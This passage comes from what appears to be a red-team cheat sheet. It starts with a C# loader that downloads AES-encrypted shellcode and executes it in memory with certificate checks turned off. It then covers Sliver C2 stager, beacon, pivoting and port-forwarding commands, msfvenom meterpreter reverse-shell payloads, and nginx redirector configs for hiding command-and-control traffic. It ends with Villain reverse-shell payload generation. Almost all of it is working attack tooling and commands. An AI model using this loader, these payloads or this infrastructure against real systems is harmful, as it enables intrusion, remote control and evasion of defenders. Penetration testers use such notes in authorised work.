        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length -1; i++) {
                l.Add(shellcode[i]);
            }

            byte[] actual = l.ToArray();

            byte[] decrypted;

            decrypted = Decrypt(actual, AESKey, AESIV);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }
    }
}

```

#### Stager

```c
sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
```

#### Examples

```c
sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE>
sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
```

```c
sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --format c --save /PATH/TO/BINARY/
```

#### Error: rpc error: code = Unknown desc = exit status 1 - Please make sure Metasploit framework >= v6.2 is installed and msfvenom/msfconsole are in your PATH

> https://github.com/BishopFox/sliver/issues/1580

```c
$ msfvenom LHOST=<LHOST> LPORT=<LPORT> -p windows/x64/meterpreter/reverse_tcp -f c -o /PATH/TO/BINARY/stager.c
```

or

```c
$ msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<LHOST> LPORT=<LPORT> LURI=/<NAME>.woff -f raw -o /PATH/TO/BINARY/<FILE>.bin
```

```c
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
```

### Common Commands, Implant and Beacon Handling

```c
sliver > mtls                                                             // Mutual Transport Layer Security
sliver > mtls --lport <LPORT>                                             // set MTLS port
sliver > jobs                                                             // display current jobs
sliver > implants                                                         // show all created implants
sliver > sessions                                                         // display currently available sessions
sliver > sessions -i <ID>                                                 // interact with a session
sliver > use -i <ID>                                                      // interact with a session
sliver > sessions -k <ID>                                                 // kill a session
sliver > upload /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY      // upload a file
sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
sliver (NEARBY_LANGUAGE) > rename -n <NAME>                               // rename beacon
sliver (NEARBY_LANGUAGE) > reconfig -i 30s -j 0s                          // reconfigure beacon
sliver (NEARBY_LANGUAGE) > beacons prune                                  // remove lost beacons
sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
sliver (NEARBY_LANGUAGE) > info                                           // provide session information
sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell (ctrl + d to get back)
sliver (NEARBY_LANGUAGE) > netstat                                        // get network information
sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
sliver (NEARBY_LANGUAGE) > background                                     // background the session
sliver (NEARBY_LANGUAGE) > seatbelt -- -group=getsystem                   // execute from armory with parameter
sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
```

### Spawning new Sessions

```c
sliver (NEARBY_LANGUAGE) > interactive
sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY/
sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
```

### Port Forwarding

```c
sliver (NEARBY_LANGUAGE) > portfwd
sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add -b 127.0.0.1:<RPORT> -r 127.0.0.1:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
```

### SOCKS Proxy

```c
sliver (NEARBY_LANGUAGE) > socks5 start
sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
```

### Pivoting

```c
sliver (NEARBY_LANGUAGE) > pivots tcp
sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > pivots
```

### Redirector

#### Nginx

##### Basic VHost Configuration

```c
server {
    listen 8443 default_server;
    listen [::]:8443 default_server;

    root /var/www/html;

    index index.html index.htm;

    server_name <DOMAIN>;

    location / {
        try_files $uri $uri/ @c2;
    }

    location @c2 {
        proxy_pass http://<RHOST>:8443;
        proxy_redirect off;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

##### Cloud Fronting Configuration

```c
server {
    listen 80;
    listen [::]:80;

    server_name <DOMAIN>;
    return 302 https://$server_name$request_uri;

    location / {
        limit_except GET HEAD POST { deny all; }
    }
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name <DOMAIN>;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    root /var/www/html/<DOMAIN>;
    index index.html;

    location / {
        limit_except GET HEAD POST { deny all; }
    }
}

server {
    listen 8443 ssl;
    listen [::]:8443 ssl;

    server_name <DOMAIN>;

    root /var/www/html/<DOMAIN>;
    index index.html;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    location / {
        try_files $uri $uri/ @c2;
        limit_except GET HEAD POST { deny all; }
    }

    location @c2 {
        proxy_pass http://<RHOST>:8443;
        proxy_redirect off;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

#### Sliver Server Configuration

##### iptables

The `iptables` rules should only accept traffic for port `22/TCP` and from the `redirector`.

```c
$ /sbin/iptables -F
$ /sbin/iptables -P INPUT DROP
$ /sbin/iptables -P OUTPUT ACCEPT
$ /sbin/iptables -I INPUT -i lo -j ACCEPT
$ /sbin/iptables -A INPUT -p tcp --match multiport --dports 22 -j ACCEPT
$ /sbin/iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
$ /sbin/iptables -A INPUT -s <RHOST> -j ACCEPT
$ /sbin/iptables -A INPUT -j DROP
$ /usr/sbin/netfilter-persistent save
$ /usr/sbin/iptables-save > /root/custom-ip-tables-rules
```

##### server.json

```c
{
    "daemon_mode": false,
    "daemon": {
        "host": "127.0.0.1",
        "port": 31337
    },
    "logs": {
        "level": 4,
        "grpc_unary_payloads": false,
        "grpc_stream_payloads": false,
        "tls_key_logger": false
    },
    "jobs": {
        "multiplayer": null
    },
    "watch_tower": null,
    "go_proxy": ""
```

#### Example

Create a `beacon` for the IP address of the `redirector`.

```c
sliver > generate beacon --http <RHOST>:8443 --os windows --arch amd64 --format exe --disable-sgn --seconds 30 --jitter 3 --save /PATH/TO/BINARY/
```

```c
sliver > http --lport 8443
```

## Villain

> https://github.com/t3l3machus/Villain

```c
$ python3 Villain.py -p 8001 -x 8002 -n 8003 -f 8004
```

### Common Commands

```c
Villain > help
Villain > connect
Villain > generate
Villain > siblings
Villain > sessions
Villain > backdoors
Villain > sockets
Villain > shell
Villain > exec
Villain > upload
Villain > alias
Villain > reset
Villain > kill
Villain > id
Villain > clear
Villain > purge
Villain > flee
Villain > exit
```

### Generate Payloads

```c
Villain > generate payload=windows/netcat/powershell_reverse_tcp lhost=<INTERFACE> encode
Villain > generate payload=linux/hoaxshell/sh_curl lhost=<INTERFACE> encode
```
